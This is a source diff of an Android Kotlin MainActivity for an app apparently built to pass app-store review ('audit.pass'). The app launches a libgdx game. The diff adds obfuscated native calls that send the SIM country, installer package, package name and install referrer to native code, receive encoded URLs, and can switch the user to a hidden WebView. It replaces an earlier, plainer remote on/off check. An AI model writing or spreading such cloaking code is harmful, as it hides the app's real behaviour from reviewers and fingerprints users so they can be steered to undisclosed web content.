@@ -1,97 +1,93 @@
 package com.audit.pass.app
 
 import android.content.Intent
-import android.content.pm.PackageManager
 import android.os.Bundle
-import android.telephony.TelephonyManager
-import android.util.Log
+import android.os.Handler
 import androidx.appcompat.app.AppCompatActivity
-import com.audit.pass.app.event.AdJustTool
-import com.audit.pass.app.event.AppsFlyTool
-import com.audit.pass.app.webView.WebActivity
-import com.audit.pass.app.utils.Const
-import com.audit.pass.app.utils.HttpCallbackListener
-import com.audit.pass.app.utils.HttpUtil
 import com.audit.pass.app.utils.LogUtil
-import com.audit.pass.app.utils.log
+import com.audit.pass.app.utils.SpUtil
+import com.audit.pass.app.utils.getInstallerPackageName
+import com.audit.pass.app.utils.getSimCountryIso
 import com.audit.pass.app.utils.setFullWindow
+import com.audit.pass.app.webView.WebActivity
 import com.libgdx.game.R
 import com.libgdx.game.android.AndroidLauncher
-import org.json.JSONObject
-import java.nio.charset.StandardCharsets
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
+import kotlinx.coroutines.runBlocking
+import org.json.JSONArray
 
 class MainActivity : AppCompatActivity() {
+
+    private val handler: Handler = Handler()
     companion object {
+        private lateinit var instance: MainActivity
+
+        fun getInstance(): MainActivity {
+            return instance
+        }
+
         @JvmStatic
-        fun receiveData(content: String) {
+        fun EKVFKNEI(content: String) {
             // 在这里处理接收到的数据
-            LogUtil.i("接收到的数据-- Received data: $content")
+            if (content.isEmpty())
+                return
+
+            val jsonArray = JSONArray(content)
+            LogUtil.i("MainActivity 接收到的数据-==============- Received data: $content \n--- ${jsonArray.length()}")
+            if (jsonArray.length() >= 1) {
+                val url = JniLibrary.LKVMEWQ(jsonArray[0].toString())
+                LogUtil.i("jsonArray[0].toString() === ${url}")
+                instance.openWeb(url)
+            }
         }
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+        instance = this
         setFullWindow(this)
         setContentView(R.layout.activity_main)
 
-//        checkOpen(Const.LINK_URL + Const.APP_KEY_ID + ".json")
-    }
-//
-//    fun checkOpen(connectURL: String) {
-//        HttpUtil.sendGetRequest(
-//            connectURL,
-//            object : HttpCallbackListener {
-//                override fun onFinish(response: ByteArray?) {
-//                    val json = String(response!!, StandardCharsets.UTF_8)
-//                    log(json)
-//                    val mjbData = JSONObject(json)
-//
-//                    if (!mjbData.getBoolean("isOpen")) {
-//                        log("not open 。。")
-//                        openGame()
-//                        return
-//                    }
-//
-//                    if (mjbData.getString("url").isNullOrEmpty()) {
-//                        log("no url -- 。。")
-//                        openGame()
-//                        return
-//                    }
-//
-//                    App.getInstance().setData(mjbData)
-//                    openWeb(mjbData)
-//                    return
-//                }
-//
-//                override fun onError(e: Exception?) {
-//                    Log.e(Const.TAG, e!!.message!!)
-//                    openGame()
-//                }
-//            })
-//    }
+        openGame()
 
+        val jsonArray = JSONArray()
+        jsonArray.put(JniLibrary.EOMVJRE(getSimCountryIso()))
+        jsonArray.put(JniLibrary.EOMVJRE(getInstallerPackageName()))
+        jsonArray.put(JniLibrary.EOMVJRE(applicationContext.packageName))
+        jsonArray.put(JniLibrary.EOMVJRE(SpUtil["referrer", ""].toString()))
+        val jsonString = jsonArray.toString()
+
+        // 使用 Coroutine 进行异步操作
+        runBlocking {
+            launch(Dispatchers.IO) {
+                val resultStr = JniLibrary.OGENIDS(jsonString)
+                LogUtil.i("resultStr ---- $resultStr -- ${resultStr.length}")
+                if (resultStr.isNullOrEmpty() || resultStr == "\"\"") {
+                    LogUtil.i("为空 返回------------")
+                    return@launch
+                }
+                App.getInstance().data = JSONArray(resultStr)
+                LogUtil.i("data 字符串数组 个数 -- ${App.getInstance().data.length()}")
+                for (i in 0 until App.getInstance().data.length()) {
+                    LogUtil.i("$i -- ${JniLibrary.LKVMEWQ(App.getInstance().data[i].toString())}")
+                }
+            }
+        }
+    }
     fun openGame() {
+        LogUtil.i("打开游戏---")
         val intent = Intent(this, AndroidLauncher::class.java)
         intent.flags = Intent.FLAG_ACTIVITY_CLEAR_TASK or Intent.FLAG_ACTIVITY_NEW_TASK
         startActivity(intent)
         finishAffinity()
     }
 
-    fun openWeb(mjbData: JSONObject) {
-
-        log("afkey --- " + mjbData.getString("afKey"))
-        if (!mjbData.getString("afKey").isNullOrEmpty()) {
-            AppsFlyTool.init(mjbData.getString("afKey"))
-        }
-
-        log("ajToken " + mjbData.getString("ajToken"))
-        if (!mjbData.getString("ajToken").isNullOrEmpty()) {
-            AdJustTool.init(mjbData.getString("ajToken"))
-        }
-
+    fun openWeb(url: String) {
+        LogUtil.i("打开网页---$url")
         val intent = Intent(this, WebActivity::class.java)
         intent.flags = Intent.FLAG_ACTIVITY_CLEAR_TASK or Intent.FLAG_ACTIVITY_NEW_TASK
-        intent.putExtra(Intent.ACTION_ATTACH_DATA, mjbData.getString("url"))
+        intent.putExtra(Intent.ACTION_ATTACH_DATA, url)
         startActivity(intent)
     }
 }
